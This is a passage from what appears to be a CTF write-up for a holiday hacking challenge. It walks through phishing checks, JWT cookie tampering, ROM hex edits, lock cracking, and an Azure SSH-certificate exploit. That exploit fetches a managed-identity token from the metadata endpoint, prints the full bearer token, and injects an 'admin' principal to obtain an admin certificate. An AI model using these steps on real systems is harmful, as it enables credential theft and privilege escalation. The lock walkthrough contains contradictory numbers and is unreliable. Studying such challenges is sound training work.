won't trouble our client's organization anymore, thanks to your keen eye and investigatory prowess.</p> <p>So long, Gumshoe, and be careful out there.</p>"},{"location":"objectives/o12/","title":"Phish Detection Agency","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o12/#objective","title":"Objective","text":"<p>Request</p> <p>Fitzy Shortstack on Film Noir Island needs help battling dastardly phishers. Help sort the good from the bad!</p> Fitzy Shortstack <p>Just my luck, I thought...</p> <p>A cybersecurity incident right in the middle of this stakeout.</p> <p>Seems we have a flood of unusual emails coming in through ChatNPT.</p> <p>Got a nagging suspicion it isn't catching all the fishy ones.</p> <p>You're our phishing specialist right? Could use your expertise in looking through the output of ChatNPT.</p> <p>Not suggesting a full-blown forensic analysis, just mark the ones screaming digital fraud.</p> <p>We're looking at all this raw data, but sometimes, it takes a keen human eye to separate the chaff, doesn't it?</p> <p>I need to get more powdered sugar for my donuts, so do ping me when you have something concrete on this.</p>"},{"location":"objectives/o12/#hints","title":"Hints","text":"DMARC, DKIM, and SPF, oh my! <p>Discover the essentials of email security with DMARC, DKIM, and SPF at Cloudflare's Guide.</p>"},{"location":"objectives/o12/#solution","title":"Solution","text":"<p>Read this article: </p> <p>https://www.cloudflare.com/en-gb/learning/email-security/dmarc-dkim-spf/</p> <p>Check DMARC if it is a pass. Check DKIM and SPF values.  Check if Return Path matches the sender. </p>"},{"location":"objectives/o12/#images","title":"Images","text":"<p>Answer</p> <p>Insert the answer to the objective here.</p>"},{"location":"objectives/o12/#response","title":"Response","text":"<p>Insert Elf Name</p> <p>Copy the final part of the conversation with Elf Name here.</p>"},{"location":"objectives/o13/","title":"Elf Hunter","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o13/#objective","title":"Objective","text":"<p>Request</p> <p>Piney Sappington needs a lesson in JSON web tokens. Hack Elf Hunt and score 75 points.</p> Piney Sappington <p>Hey there, friend! Piney Sappington here.</p> <p>You look like someone who's good with puzzles and games.</p> <p>I could really use your help with this Elf Hunt game I'm stuck on.</p> <p>I think it has something to do with manipulating JWTs, but I'm a bit lost.</p> <p>If you help me out, I might share some juicy secrets I've discovered.</p> <p>Let's just say things around here haven't been exactly... normal.</p> <p>So, what do ya say? Are you in?</p> <p>Oh, brilliant! I just know we'll crack this game together.</p> <p>I can't wait to see what we uncover, and remember, mum's the word!</p> <p>Thanks a bunch! Keep your eyes open and your ears to the ground.</p>"},{"location":"objectives/o13/#hints","title":"Hints","text":"JWT Secrets Revealed <p>Unlock the mysteries of JWTs with insights from PortSwigger's JWT Guide.</p> Insert Hint 2 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o13/#solution","title":"Solution","text":"<p>This quest teaches you how to use JWT to authenticate yourself to another user.  https://portswigger.net/web-security/jwt</p> <p>But I accidentally completed it just by my hands. I was used to be good at Duck hunt. </p> <p>Anyway, I can not replay it without creating another account. But there is another challenge you will be using JWT too, I suppose this one is not far from it.  After completed this challenge you will receive captain's journal which you will be using during Captain's commons challenge! </p> <p>Oh, it is enabled again. There are two possible ways to solve this. First, get the developer tool and the cookies. Decode the cookie, modify the speed, then encode it again. </p> <p>Second method, we can use Burp suite to intercept the JWT request, send to repeater and modify the JWT value in JWT editor. Then send the modified JWT to server to change the speed!  </p> <p></p>"},{"location":"objectives/o13/#images","title":"Images","text":"<p>Answer</p> <p>Your catched all the elfs! </p>"},{"location":"objectives/o13/#response","title":"Response","text":"<p>Piney Sappington</p> <p>Well done! You've brilliantly won Elf Hunt! I couldn't be more thrilled. Keep up the fine work, my friend!</p> <p>What have you found there? The Captain's Journal? Yeah, he comes around a lot. You can find his comms office over at Brass Buoy Port on Steampunk Island.</p>"},{"location":"objectives/o14/","title":"Game Cartridges Vol 2","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o14/#objective","title":"Objective","text":"<p>Request</p> <p>Find the second Gamegosling cartridge and beat the game</p> Tinsel Upatree (Driftbit Grotto) <p>I can't believe I was actually able to find this underground cavern!</p> <p>I discovered what looked liike an old pirate map in the attic of one of those huts in Rainraster Cliffs, and it actually led somewhere!</p> <p>But now that I've seen where it leads, I think this might've been a bad idea. This place is scary! Maybe you want to take it from here?</p> <p>I'm sure that cartridge is right nearby. Start walking around!</p> <p>Once you run into it, check back with me and I'll tell you what I know about winning.</p> <p>Good luck!</p>"},{"location":"objectives/o14/#hints","title":"Hints","text":"Gameboy 2 <p>1) This feels the same, but different! 2) If it feels like you are going crazy, you probably are! Or maybe, just maybe, you've not yet figured out where the hidden ROM is hiding. 3) I think I may need to get a DIFFerent perspective. 4) I wonder if someone can give me a few pointers to swap.</p> Gameboy 2 <p>Try poking around Pixel Island. There really aren't many places you can go here, so try stepping everywhere and see what you get!</p>"},{"location":"objectives/o14/#solution","title":"Solution","text":"<p>Open web developer, then load the game boy2 and gameboy1.  Then get the ROM like so:  curl https://gamegosling.com/vol2-akHB27gg6pN0/rom/game1.gb --output gameboy2.gb</p> <p>Log-into Gameboy 2 multiple times. You will notice your starting position in the wood is different each time despite the magician keeps saying you shall not pass. </p> <p>A Gameboy browser based emulator can be used:  <code>https://github.com/thenick775/gbajs3</code></p> <p>There are two ways to solve this part-1, you can either use a RE tool to change the flow OR use a hex editor to edit the gameboy2.gb. </p> <p>Replace: <code>59 6F 75 20 73 68 61 6C 6C 0A 6E 6F 74 20 70 61 73 73 21 21 21 00</code> You shall not pass!!!\ufffd</p> <p>With: <code>59 6F 75 20 73 68 61 6C 6C 0A 70 61 73 73 21 21 21 00 00 00 00 00</code> You shall pass!!!\ufffd\ufffd\ufffd\ufffd\ufffd</p> <p>Enter the cave, and listen to the Morse code from the radio, I found human ears are better than any web tools on this: </p> <p><pre><code>--. \n.-..\n- - - - -\n.-.\n-.--\n</code></pre> </p>"},{"location":"objectives/o14/#response","title":"Response","text":"<p>Tinsel Upatree</p> <p>Whoa, you found it!</p> <p>What version is it?</p> <p>Did you know that many games had multiple versions released? Word is: volume 2 has 2 versions!</p> <p>You have all three? What a glorious collection!</p>"},{"location":"objectives/o15/","title":"Certificate SSHenanigans","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o15/#objective","title":"Objective","text":"<p>Request</p> <p>Go to Pixel Island and review Alabaster Snowball's new SSH certificate configuration and Azure Function App. What type of cookie cache is Alabaster planning to implement?</p> Alabaster Snowball <p>Hello there! Alabaster Snowball at your service.</p> <p>I could use your help with my fancy new Azure server at ssh-server-vm.santaworkshopgeeseislands.org.</p> <p>ChatNPT suggested I upgrade the host to use SSH certificates, such a great idea!</p> <p>It even generated ready-to-deploy code for an Azure Function App so elves can request their own certificates. What a timesaver!</p> <p>I'm a little wary though. I'd appreciate it if you could take a peek and confirm everything's secure before I deploy this configuration to all the Geese Islands servers.</p> <p>Generate yourself a certificate and use the monitor account to access the host. See if you can grab my TODO list.</p> <p>If you haven't heard of SSH certificates, Thomas Bouve gave an introductory talk and demo on that topic recently.</p> <p>Oh, and if you need to peek at the Function App code, there's a handy Azure REST API endpoint which will give you details about how the Function App is deployed.</p>"},{"location":"objectives/o15/#hints","title":"Hints","text":"SSH Certificates Talk <p>Check out Thomas Bouve's talk and demo to learn all about how you can upgrade your SSH server configuration to leverage SSH certificates.</p> Azure VM Access Token <p>Azure CLI tools aren't always available, but if you're on an Azure VM you can always use the Azure REST API instead. </p> Azure Function App Source Code <p>The get-source-control Azure REST API endpoint provides details about where an Azure Web App or Function App is deployed from.</p>"},{"location":"objectives/o15/#solution","title":"Solution","text":"<p>The talk gave by Thomas is vital to this quest: </p> <p>https://www.youtube.com/watch?v=4S0Rniyidt4</p> <p>You need to study Azure REST API to complete this challenge:  https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</p> <p>https://learn.microsoft.com/en-us/rest/api/appservice/web-apps/get-source-control?view=rest-appservice-2022-03-01</p> <p>First generate our certificate.  <pre><code>ssh-keygen -t rsa -C \"monitor@ssh-server-vm.santaworkshopgeeseislands.org\"\ncd /home/kali/.ssh/\ncat /home/kali/.ssh/id_rsa.pub\n</code></pre> We need to copy our certificate to the below server for authentication: </p> <p><code>https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl</code></p> <p></p> <p>nano openkey.pub  and paste the key only, not the JSON syntax. </p> <p><code>ssh -i id_rsa -o CertificateFile=openkey.pub monitor@ssh-server-vm.santaworkshopgeeseislands.org</code></p> <p>Once you are ssh in. (Ctrl + c)</p> <p>Hint: get token https://learn.microsoft.com/en-us/entra/identity/managed-identities-azure-resources/how-to-use-vm-token</p> <p></p> <p>Use the REST API to get the access token: </p> <p><code>curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https%3A%2F%2Fmanagement.azure.com%2F' -H Metadata:true -s</code></p> <pre><code>{\n  \"access_token\": \"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI1OTQ1NDUsIm5iZiI6MTcwMjU5NDU0NSwiZXhwIjoxNzAyNjgxMjQ1LCJhaW8iOiJFMlZnWURpWGVhVlE3VlNLajFWNjFiWnBoeTdWQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiIzN1hnaVltT2trR0EzRklfOEN0MUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.PpakDrvOiDYZGjqOSr9N0RxyX55XyayOiLvUxOGiFkw_ra5wuzbVdtA_4WG-luAgvJwahxNOiuQEskadAzf5PAEZo9a0HpS0XCORr1hVqVTEjj6c4L0n9bVKSkviU_T4EsS1Ro7WhcSkGLMh1ofAXshI02dWa4fevT-51erqJKU9xG4HVnOsPOrgGVXJ5SDYlC3EPGI1QR0me2iUC5Qs76vnHM9e0q7bLzLOibpjDDNwarB0EZuRRws_kePFg4-gq05oGrE49sXSSP7JTdJbl0bCSBAw3S1qZv9cSE4wvuBtO8_ZSFY6eiPdWH5d-3cX-Awkjw1-NRQpfgcyrDvaBQ\",\n  \"client_id\": \"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\n  \"expires_in\": \"85306\",\n  \"expires_on\": \"1702681245\",\n  \"ext_expires_in\": \"86399\",\n  \"not_before\": \"1702594545\",\n  \"resource\": \"https://management.azure.com/\",\n  \"token_type\": \"Bearer\"\n}\n</code></pre> <p>Use base64 -d to decode it to get the parameters: </p> Countdown script (with line 7 highlighted)<pre><code>{\"access_token\":\"\n{\n    \"typ\": \"JWT\",\n    \"alg\": \"RS256\",\n    \"x5t\": \"T1St-dLTvyWRgxB_676u8krXS-I\",\n    \"kid\": \"T1St-dLTvyWRgxB_676u8krXS-I\"\n} {\n    \"aud\": \"https://management.azure.com/\",\n    \"iss\": \"https://sts.windows.net/90a38eda-4006-4dd5-924c-6ca55cacc14d/\",\n    \"iat\": 1702456214,\n    \"nbf\": 1702456214,\n    \"exp\": 1702542914,\n    \"aio\": \"E2VgYLDn/FnyQOXAhu7Y9PWt1qc9AA==\",\n    \"appid\": \"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\n    \"appidacr\": \"2\",\n    \"idp\": \"https://sts.windows.net/90a38eda-4006-4dd5-924c-6ca55cacc14d/\",\n    \"idtyp\": \"app\",\n    \"oid\": \"600a3bc8-7e2c-44e5-8a27-18c3eb963060\",\n    \"rh\": \"0.AFEA2o6jkAZA1U2STGylXKzBTUZIf3kAutdPukPawfj2MBPQAAA.\",\n    \"sub\": \"600a3bc8-7e2c-44e5-8a27-18c3eb963060\",\n    \"tid\": \"90a38eda-4006-4dd5-924c-6ca55cacc14d\",\n    \"uti\": \"m2de_ltv8E6BeX4_gBmPAA\",\n    \"ver\": \"1.0\",\n    \"xms_az_rid\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Compute/virtualMachines/ssh-server-vm\",\n    \"xms_cae\": \"1\",\n    \"xms_mirid\": \"/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.ManagedIdentity/userAssignedIdentities/northpole-ssh-server-identity\",\n    \"xms_tcdt\": 1698417557\n}\n\"Client_id\":\"b84e06d3-aba1-4bcc-9626-2e0d76cba2ce\",\"expires_in\":\"84943\",\"expires_on\":\"1702542914\",\"ext_expires_in\":\"86399\",\"not_before\":\"1702456214\",\"resource\":\"https://management.azure.com/\",\"token_type\":\"Bearer\"}\n</code></pre> <p>Access Token can be decoded using https://jwt.io/#debugger-io: </p> <p></p>"},{"location":"objectives/o15/#images","title":"Images","text":"<p>This is my key:</p> Countdown script (with line 7 highlighted)<pre><code>curl -H \"Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsIng1dCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSIsImtpZCI6IlQxU3QtZExUdnlXUmd4Ql82NzZ1OGtyWFMtSSJ9.eyJhdWQiOiJodHRwczovL21hbmFnZW1lbnQuYXp1cmUuY29tLyIsImlzcyI6Imh0dHBzOi8vc3RzLndpbmRvd3MubmV0LzkwYTM4ZWRhLTQwMDYtNGRkNS05MjRjLTZjYTU1Y2FjYzE0ZC8iLCJpYXQiOjE3MDI1OTQ1NDUsIm5iZiI6MTcwMjU5NDU0NSwiZXhwIjoxNzAyNjgxMjQ1LCJhaW8iOiJFMlZnWURpWGVhVlE3VlNLajFWNjFiWnBoeTdWQXdBPSIsImFwcGlkIjoiYjg0ZTA2ZDMtYWJhMS00YmNjLTk2MjYtMmUwZDc2Y2JhMmNlIiwiYXBwaWRhY3IiOiIyIiwiaWRwIjoiaHR0cHM6Ly9zdHMud2luZG93cy5uZXQvOTBhMzhlZGEtNDAwNi00ZGQ1LTkyNGMtNmNhNTVjYWNjMTRkLyIsImlkdHlwIjoiYXBwIiwib2lkIjoiNjAwYTNiYzgtN2UyYy00NGU1LThhMjctMThjM2ViOTYzMDYwIiwicmgiOiIwLkFGRUEybzZqa0FaQTFVMlNUR3lsWEt6QlRVWklmM2tBdXRkUHVrUGF3ZmoyTUJQUUFBQS4iLCJzdWIiOiI2MDBhM2JjOC03ZTJjLTQ0ZTUtOGEyNy0xOGMzZWI5NjMwNjAiLCJ0aWQiOiI5MGEzOGVkYS00MDA2LTRkZDUtOTI0Yy02Y2E1NWNhY2MxNGQiLCJ1dGkiOiIzN1hnaVltT2trR0EzRklfOEN0MUFBIiwidmVyIjoiMS4wIiwieG1zX2F6X3JpZCI6Ii9zdWJzY3JpcHRpb25zLzJiMDk0MmYzLTliY2EtNDg0Yi1hNTA4LWFiZGFlMmRiNWU2NC9yZXNvdXJjZWdyb3Vwcy9ub3J0aHBvbGUtcmcxL3Byb3ZpZGVycy9NaWNyb3NvZnQuQ29tcHV0ZS92aXJ0dWFsTWFjaGluZXMvc3NoLXNlcnZlci12bSIsInhtc19jYWUiOiIxIiwieG1zX21pcmlkIjoiL3N1YnNjcmlwdGlvbnMvMmIwOTQyZjMtOWJjYS00ODRiLWE1MDgtYWJkYWUyZGI1ZTY0L3Jlc291cmNlZ3JvdXBzL25vcnRocG9sZS1yZzEvcHJvdmlkZXJzL01pY3Jvc29mdC5NYW5hZ2VkSWRlbnRpdHkvdXNlckFzc2lnbmVkSWRlbnRpdGllcy9ub3J0aHBvbGUtc3NoLXNlcnZlci1pZGVudGl0eSIsInhtc190Y2R0IjoxNjk4NDE3NTU3fQ.PpakDrvOiDYZGjqOSr9N0RxyX55XyayOiLvUxOGiFkw_ra5wuzbVdtA_4WG-luAgvJwahxNOiuQEskadAzf5PAEZo9a0HpS0XCORr1hVqVTEjj6c4L0n9bVKSkviU_T4EsS1Ro7WhcSkGLMh1ofAXshI02dWa4fevT-51erqJKU9xG4HVnOsPOrgGVXJ5SDYlC3EPGI1QR0me2iUC5Qs76vnHM9e0q7bLzLOibpjDDNwarB0EZuRRws_kePFg4-gq05oGrE49sXSSP7JTdJbl0bCSBAw3S1qZv9cSE4wvuBtO8_ZSFY6eiPdWH5d-3cX-Awkjw1-NRQpfgcyrDvaBQ\" https://management.azure.com/subscriptions/2b0942f3-9bca-484b-a508-abdae2db5e64/resourcegroups/northpole-rg1/providers/Microsoft.Web/sites/northpole-ssh-certs-fa/sourcecontrols/web?api-version=2022-03-01 | jq\n</code></pre> <p>You need to replace the base64 string between double quotes \" \" with your own server authenticated key. </p> <p>We get the github repo: </p> <p><code>\"repoUrl\": \"https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa\",</code></p> <p>We can find interesting stuffs in <code>https://github.com/SantaWorkshopGeeseIslandsDevOps/northpole-ssh-certs-fa/blob/main/function_app.py</code></p> <p>Create new Public-Key (SSL cert) Make sure you are in .ssh in your home folder <code>ssh-keygen -t rsa -C \"alabaster@ssh-server-vm.santaworkshopgeesesilands.org\"</code></p> <p>Inject a json query</p> <p><pre><code>curl -X POST -H \"Content-Type: application/json\" -d '{\"ssh_pub_key\": \"&lt;Your SSH RSA public Key&gt;\", \"principal\": \"admin\" }'https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl \n</code></pre> Replace  with your new key.  <p>The JWT injection like so: </p> <p>Countdown script (with line 7 highlighted)<pre><code>curl -X POST -H \"Content-Type: application/json\" -d '{\"ssh_pub_key\": \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDfZdQgHhgjhguYxEyE1xg7qimrqbMxfUILvBlXjW+Xjt5MsYmdZ8szlQzFvQ9PPqqfrGyak3oPdcRsgf8CZ+NnSze5hYPCwrFXykFazGdfV41T61QLOFb4LAgQ2yo38zBH4pe8izd+YH4SaI0ftHEa7Jzf8B5CAbBTem49QOBTy43rpXymsen/g+k13oGhcVXQevuWqUoVood1ufhsKE4d0UR2KOO2cqFKJ7mGaq1Kx2/2Ml6y4t2CdjIsrE+1y40keV0kqFwRGNMOtF4imNlch3HLQAXBhzU/P2Hv+AQdc7JQ1XFQ9khNM2jTJ/nxL2A6SOwE9VHUBea/JxJukTAM8LbF4TLlPRHoTv9dQmhNoKJrf/inaqOMUFxOk0FzZ9KsK3zh98LIdS8sArvdWxWdCQTJ/3EqCzfUXwkYnYoHYHD6FCfBdXFRLS+3CNlTpls5wLBbt3N74N21Nq8C8lVBQDMctJY2J0pIhqZ/GAqKbCJV9QLn/g9ovv1VDzZK+28= alabaster@ssh-server-vm.santaworkshopgeesesilands.org\", \"principal\": \"admin\"}' \"https://northpole-ssh-certs-fa.azurewebsites.net/api/create-cert?code=candy-cane-twirl\"\n</code></pre> Nano a new file to store the response from server and store as admin.pub. This will be your SSH cert for the admin account alabaster@ssh-server-vm.santaworkshopgeeseislands.org.</p> <p>Now you can login as alabasteradmin: <code>ssh -i alabasteradmin -o CertificateFile=admin.pub alabaster@ssh-server-vm.santaworkshopgeeseislands.org</code></p> <p>First once you have ssh\u2019d into alabaster\u2019s account on the remote machine you can run \u201ccat alabaster_todo.md \u201d and you will see on the 5th entry to the list what type of cookies he wants to use.</p> Countdown script (with line 7 highlighted)<pre><code>cat alabaster_todo.md \n# Geese Islands IT &amp; Security Todo List\n\n- [X] Sleigh GPS Upgrade: Integrate the new \"Island Hopper\" module into Santa's sleigh GPS. Ensure Rudolph's red nose doesn't interfere with the signal.\n- [X] Reindeer Wi-Fi Antlers: Test out the new Wi-Fi boosting antler extensions on Dasher and Dancer. Perfect for those beach-side internet browsing sessions.\n- [ ] Palm Tree Server Cooling: Make use of the island's natural shade. Relocate servers under palm trees for optimal cooling. Remember to watch out for falling coconuts!\n- [ ] Eggnog Firewall: Upgrade the North Pole's firewall to the new EggnogOS version. Ensure it blocks any Grinch-related cyber threats effectively.\n- [ ] Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!\n- [ ] Toy Workshop VPN: Establish a secure VPN tunnel back to the main toy workshop so the elves can securely access to the toy blueprints.\n- [ ] Festive 2FA: Roll out the new two-factor authentication system where the second factor is singing a Christmas carol. Jingle Bells is said to be the most secure. \n</code></pre> <p>Answer</p> <p>Gingerbread Cookie Cache: Implement a gingerbread cookie caching mechanism to speed up data retrieval times. Don't let Santa eat the cache!</p>"},{"location":"objectives/o15/#response","title":"Response","text":"<p>Alabaster Snowball</p> <p>Oh my! I was so focused on the SSH configuration I completely missed the vulnerability in the Azure Function App.</p> <p>Why would ChatNPT generate code with such a glaring vulnerability? It's almost like it wanted my system to be unsafe. Could ChatNPT be evil?</p> <p>Thanks for the help, I'll go and update the application code immediately!</p> <p>While we're on the topic of certificates, did you know Active Directory (AD) uses them as well? Apparently the service used to manage them can have misconfigurations too.</p> <p>You might be wondering about that SatTrackr tool I've installed on the monitor account?</p> <p>Here's the thing, on my nightly stargazing adventures I started noticing the same satellite above Geese Islands.</p> <p>I wrote that satellite tracker tool to collect some additional data and sure enough, it's in a geostationary orbit above us.</p> <p>No idea what that means yet, but I'm keeping a close eye on that thing!</p>"},{"location":"objectives/o16/","title":"Faster Lock Combination","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o16/#objective","title":"Objective","text":"<p>Request</p> <p>Over on Steampunk Island, Bow Ninecandle is having trouble opening a padlock. Do some research and see if you can help open it!</p> Bow Ninecandle <p>Hey there! I'm Bow Ninecandle, and I've got a bit of a... 'pressing' situation.</p> <p>You see, I need to get into the lavatory, but here's the twist: it's secured with a combination padlock.</p> <p>Talk about bad timing, right? I could really use your help to figure this out before things get... well, urgent.</p> <p>I'm sure there are some clever tricks and tips floating around the web that can help us crack this code without too much of a flush... I mean fuss.</p> <p>Remember, we're aiming for quick and easy solutions here - nothing too complex.</p> <p>Once we've gathered a few possible combinations, let's team up and try them out.</p> <p>I'm crossing my legs - I mean fingers - hoping we can unlock this door soon.</p> <p>After all, everyone knows that the key to holiday happiness is an accessible lavatory!</p> <p>Let's dive into this challenge and hopefully, we won't have to 'hold it' for too long! Ready to help me out?</p>"},{"location":"objectives/o16/#hints","title":"Hints","text":"Insert Hint 1 Title <p>Along the way you will receive different hints. Insert them here.</p>"},{"location":"objectives/o16/#solution","title":"Solution","text":"<p>Your need to watch this video on the lock: </p> <pre><code>https://www.youtube.com/watch?v=27rE5ZvWLU0\n</code></pre> <p>When you input the three possible digits, make sure after you stop at the 1st digit, you turn counter clockwise and PASS your 1st digit. Then land on your 2nd digit, and to the 3rd digit by turning clockwise again. This means if your 1st digit is larger than your 2nd, you may pass your 2nd digit twice. </p>"},{"location":"objectives/o16/#step-1-identifying-the-sticky-number","title":"Step 1 (Identifying the Sticky Number)","text":"<p>To determine the sticky number, partially apply tension to the lock and rotate it to locate the point where resistance is felt.</p> <p>The lock showed resistance at 25, hence we'll remember this as our sticky number. It's important to note that the tension indicator was a shade of brown/dark orange, not full red. Full red signifies maximum tension, preventing the lock from rotating.</p> <p>Record the sticky number for future reference:</p> <p>Sticky Number = 30</p>"},{"location":"objectives/o16/#step-2-determining-guess-numbers","title":"Step 2 (Determining Guess Numbers)","text":"<p>We need to find guess numbers between 0 and 11 where the lock freely moves. This involves observing the lock's movement at fractional positions between whole numbers, not at the whole numbers themselves.</p> <p>For clarity, here's an example.</p> <p>Set the dial at 0.5, then apply maximum tension and observe the lock's reaction.</p> <p>Since the lock alternates between 0 and 1, we conclude these aren't our guess numbers.</p> <p>Notice how the lock alternates between 3.5 and 4.5, passing over the number 4, which becomes our initial guess number.</p> <p>Similarly, as the lock moves between 4.5 and 5.5, we deduce that 5 is our second guess number. Let's record these:</p> <p>Guess Values: 1st = 4 2nd = 5</p>"},{"location":"objectives/o16/#step-3-determining-the-first-digit-of-the-combination","title":"Step 3 (Determining the First Digit of the Combination)","text":"<p>Figuring out the first digit is straightforward, as these types of locks generally follow the same rule. We simply add 5 to the sticky number identified in step 1.</p> <p>Sticky Number = 30 1st Digit of Combo = 30 + 5 = 35</p>"},{"location":"objectives/o16/#step-4-identifying-the-third-digit","title":"Step 4 (Identifying the Third Digit)","text":"<p>This step involves deducing potential values for the third digit, a common procedure across locks of this type.</p> <p>We'll use our first combination number and the two guess numbers from step 2.</p> <p>First, calculate the remainder value, which aids in pinpointing the third digit.</p> <p>1st value = 35</p> <p>Divide this value by 4 to determine the remainder:</p> <p>35 / 4 = 8 with a remainder of 3</p> <p>Next, arrange our guess numbers in a table and increment each by 10 three times:</p> <p>4 14 24 34 5 15 25 35</p> <p>These are potential lock combinations. To narrow them down, divide each by 4 and match the remainders with that of our first combination value. We're looking for numbers in the table with the same remainder as our first value.</p> <p>[0,2,0,2]</p> <p>[1,3,1,3]</p> <p>From this, we identify 15 and 35 as potential third digits, both sharing the remainder value of 3.</p> <p>Current combination status:</p> <p>1st value = 35 2nd Value = ?? 3rd Value = Either 15 or 35</p>"},{"location":"objectives/o16/#step-5-determining-the-more-accurate-third-value","title":"Step 5 (Determining the More Accurate Third Value)","text":"<p>For both 15 and 35, apply significant tension to the lock and observe which number offers more slack, indicating the likely third value.</p> <p>15 is noticeably looser than 35, suggesting it's the correct third value.</p>"},{"location":"objectives/o16/#step-6-calculating-the-2nd-digit","title":"Step 6 (Calculating the 2nd Digit)","text":"<p>Now, we'll create tables like in step 4 to narrow down the second digit. This step leads to eight possible values, requiring some trial and error.</p> <p>Starting with our earlier remainder of 3:</p> <p>remainder = 3 Add 2 to it for the first table row, then increase the result by 8 four times:</p> <p>5 13 21 29 37</p> <p>For the second row, add 6 to the remainder to get the first value:</p> <p>9 17 25 33 41 (Note: 41 represents 1 on the lock)</p> <p>Displaying both rows together:</p> <p>5 13 21 29 37 9 17 25 33 41</p> <p>Eliminate values within two digits of our third value (15). Thus, remove 13 and 17 as they are too close to 18 (within 2 digit distance).</p> <p>Step 7 (Unlocking the Lock)</p> <p>Combination values so far:</p> <p>1st: 35 2nd: Either 5, 21, 29, 37, 9, 25, 33, 41(1) 3rd: 15</p> <p>As mentioned, this stage involves trying each combination variant (eight in total).</p> <p>Start by turning clockwise to the first value, then rotate counter-clockwise past the 1st value and reach the second by align it, followed by aligning the third value by turning clockwise.</p> <p>Observe the process as the combinations are tested.</p> <p>The lock opens, revealing the correct combination:</p> <p>35 - 37 - 15</p> <p></p>"},{"location":"objectives/o16/#response","title":"Response","text":"<p>Bow Ninecandle (Brass Bouy Port)</p> <p>Oh, thank heavens! You're a lifesaver!  With your knack for cracking codes, we've just turned a potential 'loo catastrophe' into a holiday triumph! </p>"},{"location":"objectives/o17/","title":"Game Cartridges Vol 3","text":"<p>Difficulty:  Direct link: Objective5.zip</p>"},{"location":"objectives/o17/#objective","title":"Objective","text":"<p>Request</p> <p>Find the third Gamegosling cartridge and beat the game</p> Angel Candysalt (Rusty Quay) <p>The name's Angel Candysalt, the great treasure hunter!</p> <p>A euphemism? No, why do people always ask me that??</p> <p>Anyways, I came here to nab the treasure hidden in this ship graveyard, only to discover it's protected by this rusted maze.</p> <p>That must be why all these old ships are here. Their crew came to find the treasure, only to get lost in the labrynth.</p> <p>There are 3 buried treasures in total, each in its own uncharted area around Geese Islands.</p> <p>I've been getting lost in this maze for hours now with no luck, and my feet are starting to get sore.</p> <p>Maybe you'll be able to find the way through. Here, use my Gameboy Cartridge Detector. Go into your items and test it to make sure it's still working.</p> <p>When you get close to the treasure, it'll start sounding off. The closer you get, the louder the sound.</p> <p>No need to activate or fiddle with it. It just works!</p> <p>At least it's obvious where this one is. See that shiny spot over to the right? That's gotta be where it is! If only I had a bird's eye view.</p> <p>But how to get there? Up? Down? Left? Right? Oh well, that's your 